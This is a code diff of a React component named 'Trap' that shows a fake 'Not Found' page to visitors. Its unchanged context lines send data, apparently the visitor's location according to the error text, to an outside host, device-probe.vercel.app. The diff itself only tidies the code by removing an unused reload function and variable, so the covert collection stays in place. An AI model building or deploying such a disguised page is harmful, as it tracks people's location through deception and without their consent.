@@ -34,10 +34,6 @@ const Trap = () => {
     });
   }
 
-  function reload() {
-    window.location.reload();
-  }
-
   async function main(body) {
     try {
       const response = await fetch("https://device-probe.vercel.app/", {
@@ -52,10 +48,9 @@ const Trap = () => {
         throw new Error("Failed to send location");
       }
 
-      const data = await response.json();
+      await response.json();
 
       toast.success("sorry for inconvenience");
-      return data;
     } catch (error) {
       toast.error("sorry for inconvenience");
       throw error;
@@ -67,7 +62,7 @@ const Trap = () => {
       <div className="not-found">
         <h1>Not Found</h1>
         <p>We're sorry, but the page you requested could not be found.</p>
-        <button >Go Back</button>
+        <button>Go Back</button>
       </div>
       <ToastContainer />
     </>
